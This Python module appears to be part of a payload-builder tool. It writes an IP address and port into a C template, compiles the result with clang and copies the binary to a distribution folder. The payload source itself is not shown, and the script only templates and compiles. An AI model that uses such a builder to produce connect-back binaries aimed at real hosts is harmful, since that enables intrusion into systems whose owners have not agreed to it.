from os import path, remove, listdir
import subprocess

from api import payconf

class Config(payconf.Config):
    def __init__(self, output: str, cpath: str) -> None:
        self.output = output
        self.path = cpath

    def run(self, ip, port):
        # == >> [ START WRITING TEMPLATE ] << ==
        
        hsrc_main = open(path.join(self.path, "main.c"), "r+")
        src_main = hsrc_main.read()
        bkp_main = src_main

        src_main = src_main.replace("%ip%", f"\"{ip}\"")
        src_main = src_main.replace("%port%", f"{port}")

        hsrc_main.seek(0)

        hsrc_main.write(src_main)

        hsrc_main.close()

        #  == >> [ STOP WRITING TEMPLATE ] << ==

        # compiling
        subprocess.run(["sh", "-c", "clang include/*.c -Iinclude -c"], cwd=self.path)
        subprocess.run(["sh", "-c", f"clang *.o main.c -o {self.output} -Iinclude"], cwd=self.path)
        
        # remove obj files
        for f in listdir(self.path):
            if f.endswith(".o"):
                remove(path.join(self.path, f))
        
        # == >> [ WRITE ORIGINAL TEMPLATE ] << ==

        with open(path.join(self.path, "main.c"), "w") as hsrc_main:
            hsrc_main.write(bkp_main)

            hsrc_main.close()

        payconf.move_to_dist(path.join(self.path, self.output))

        
